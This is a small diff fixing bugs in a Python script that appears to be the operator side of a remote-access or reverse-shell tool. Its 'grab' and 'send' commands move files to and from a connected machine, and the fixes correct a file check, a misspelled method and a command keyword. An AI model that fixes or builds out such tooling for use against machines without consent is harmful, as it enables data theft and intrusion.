@@ -41,7 +41,7 @@ def doSend(conn, sourcePath, destinationPath, fileName):
         full_path= os.path.join(sourcePath, fileName)
         print(f"[~] Looking 4 File: {full_path} ")
         # Checking if file exists
-        if not os.path.exists(full_path):
+        if not os.path.isfile(full_path):
             conn.send(b"[-] File not found")
             print(f"[-] File does not exist: {full_path}")
             return
@@ -93,10 +93,10 @@ def connect():
                 conn.close()
                 break
 
-            elif userinput.startwith("grab"):
+            elif userinput.startswith("grab"):
                 letGrab(conn, userinput, "grab")
 
-            elif 'sent' in userinput:
+            elif 'send' in userinput:
                 sendCmd, destination, fileName = userinput.split("*")
                 source = input("Scource path: ")
                 conn.send(userinput.encode())
